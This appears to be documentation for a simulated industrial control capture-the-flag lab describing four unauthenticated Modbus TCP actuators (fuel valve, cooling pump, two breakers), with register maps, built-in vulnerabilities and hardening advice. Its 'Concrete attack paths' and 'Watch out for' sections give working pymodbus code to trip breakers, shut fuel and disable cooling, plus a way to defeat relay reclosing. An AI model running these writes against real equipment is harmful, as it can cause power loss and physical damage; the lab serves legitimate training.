# Modbus actuators

Four actuator containers serve as the physical endpoints of the control loop:
a fuel valve, a cooling pump, and two circuit breakers. All four run from the
same image (`iotechsys/pymodbus-sim:1.0.6-x86_64`) with different profiles
selected by the `ACTUATOR_TYPE` environment variable. All four listen on port 502
with no authentication.

The turbine PLC writes to the fuel valve and reads the breaker state. The relay
IEDs write to the breakers on fault. The engineering workstation config files
include the IP and register address of every actuator in the plant.

## Where this fits in real plant

Physical actuators in industrial plant typically communicate via proprietary
fieldbus (PROFIBUS, DeviceNet) or, increasingly, Modbus TCP. When a Modbus TCP
actuator is directly reachable from a compromised host, the attacker can operate
it as if they were the PLC. Circuit breakers are the most operationally
significant: tripping a breaker disconnects a feeder and causes a loss of supply.
In a real site, this requires physical recovery; in the simulator, the relay IED
reclosure logic restores it after 10 seconds unless the fault condition persists.

## Container details

Base image: `iotechsys/pymodbus-sim:1.0.6-x86_64`. Standalone Modbus TCP
simulator from IOTech Systems; no Edge Central or XRT required. https://hub.docker.com/r/iotechsys/pymodbus-sim

Four instances, each configured by `ACTUATOR_TYPE`:

| Hostname          | IP         | Type    | Register map                               |
|-------------------|------------|---------|--------------------------------------------|
| uupl-fuel-valve   | 10.10.3.51 | valve   | HR[0] = valve_position (0-100%)            |
| uupl-cooling-pump | 10.10.3.52 | pump    | HR[0] = pump_speed (0-100%)                |
| uupl-breaker-a    | 10.10.3.53 | breaker | coil[0]=state, coil[1]=trip, coil[2]=close |
| uupl-breaker-b    | 10.10.3.54 | breaker | coil[0]=state, coil[1]=trip, coil[2]=close |

Valve and pump use `HOLDING_REGISTERS` at address 0. Breakers use `COILS` at
addresses 0-2.

Breaker logic: a Python script (`scripts/breaker-logic.py`) runs alongside the
profile. It initialises coil[0] to 1 (closed) and processes trip/close commands:
writing coil[1] = 1 opens the breaker (coil[0] = 0) and clears the trip command;
writing coil[2] = 1 closes it and clears the close command.

Exposed port: 502/tcp.

## Connections

- `ics_control`:
  - uupl-fuel-valve: 10.10.3.51
  - uupl-cooling-pump: 10.10.3.52
  - uupl-breaker-a: 10.10.3.53
  - uupl-breaker-b: 10.10.3.54
- Written to by turbine PLC (fuel valve, HR[0]; breaker state read)
- Written to by relay IED A (breaker A trip/close) and relay IED B (breaker B)
- Readable and writable by engineering workstation (10.10.3.100)

## Protocols

Modbus TCP: port 502. No authentication.

## Built-in vulnerabilities

Unauthenticated Modbus TCP: any host on `ics_control` can write to any actuator
register without credentials.

Circuit breaker trip: writing coil[1] = 1 to either breaker trips it immediately.
This disconnects the corresponding feeder and drops line voltage to zero. The
relay IED will attempt a reclose after 10 seconds; if the trip command is written
again before or after the reclose, the feeder stays disconnected.

Fuel valve manipulation: writing HR[0] = 0 to the fuel valve closes it
completely, causing the turbine to coast down. Writing HR[0] = 100 pushes the
fuel valve fully open, which will cause an overspeed condition if the governor
setpoint is not raised simultaneously.

Cooling pump manipulation: writing HR[0] = 0 to the cooling pump removes
cooling, causing temperature to rise. If temperature reaches the trip threshold
(490 C), the PLC trips the turbine on overtemperature.

## Modifying vulnerabilities

To change the breaker initial state (start open instead of closed): edit
`set_initial()` in `scripts/breaker-logic.py` to set `coil[0] = 0`.

To change the register address: edit the `startingAddress` field in the
corresponding profile JSON in `configs/`.

To add a second register to an actuator: add another entry to `deviceResources`
in the profile JSON.

To change which actuator type an instance runs: set `ACTUATOR_TYPE` in
`ctf-config.yaml` under the relevant device's `environment` block.

## Hardening suggestions

Restrict Modbus access to port 502 on each actuator to the specific source IPs
that legitimately write to it (the PLC for fuel valve, the relay IEDs for
breakers). The engineering workstation may need read access but not write. A
Modbus-aware firewall or gateway can enforce this at the register level.

## Observability and debugging

```bash
docker logs uupl-fuel-valve
docker logs uupl-breaker-a
docker exec -it uupl-breaker-a sh
```

Read breaker A state:
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.53',502); c.connect(); print(c.read_coils(0,3,slave=1).bits[:3])"
```

Read fuel valve position:
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.51',502); c.connect(); print(c.read_holding_registers(0,1,slave=1).registers)"
```

## Concrete attack paths

Trip both feeder breakers (loss of distribution):
```python
from pymodbus.client import ModbusTcpClient
for ip in ['10.10.3.53', '10.10.3.54']:
    c = ModbusTcpClient(ip, port=502)
    c.connect()
    c.write_coil(1, True, slave=1)  # coil[1] = trip command
    c.close()
```

Close fuel valve (turbine coast-down, no immediate trip):
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.51',502); c.connect(); c.write_register(0,0,slave=1)"
```

Disable cooling (temperature rise leading to overtemperature trip):
```bash
python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.10.3.52',502); c.connect(); c.write_register(0,0,slave=1)"
```

## Watch out for

The breaker trip coil is self-clearing: once the breaker logic processes
`coil[1] = 1`, it sets the breaker state and clears the trip command. Persistent
disconnection requires either repeated writes or writing coil[0] directly.

The relay IED reclose logic will attempt to close the breaker 10 seconds after a
trip. If the breaker is then immediately re-tripped via Modbus, the relay enters
a "reclose-failed" state and stops attempting to reclose. The breaker remains
open until manually closed.

The fuel valve and pump are purely receptive: they hold a value that the PLC
reads. Writing to them does not immediately cause the PLC to act differently;
the PLC reads them on its own cycle and the governor loop overrides the fuel
valve value if the governor setpoint is active.

## In short

Four Modbus TCP actuators: fuel valve, cooling pump, and two circuit breakers.
No authentication. Writing coil[1] = 1 to either breaker trips the corresponding
feeder. Writing HR[0] = 0 to the fuel valve coasts the turbine down. Writing
HR[0] = 0 to the cooling pump raises temperature toward the overtemperature trip.
